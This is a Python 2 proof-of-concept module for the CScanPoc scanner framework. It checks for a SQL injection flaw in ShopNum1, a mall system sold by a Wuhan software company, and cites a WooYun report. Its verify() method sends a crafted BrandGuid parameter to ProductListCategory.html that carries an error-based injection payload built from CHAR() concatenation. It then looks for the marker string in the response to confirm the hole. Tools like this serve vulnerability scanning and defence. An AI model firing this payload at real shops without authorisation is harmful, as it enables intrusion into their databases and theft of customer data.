# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    poc_id = '0d84c4ee-8569-493b-b33b-13a2e7647c61'
    name = '武汉群翔软件有限公司商城系统注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-12'  # 漏洞公布时间
    desc = '''
        武汉群翔软件有限公司商城系统注入.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0118352
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ShopNum1'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '11650745-035b-4230-8e6b-22b25b880011'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
        
            arg = '{target}'.format(target=self.target)
            payload = "/ProductListCategory.html?BrandGuid=ac69ddd9-3900-43b0-939b-3b1d438ca190%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
            url=arg+payload
            code, head, res, errcode,finalurl =  hh.http(url)
            if code == 200 and "testXQ17" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
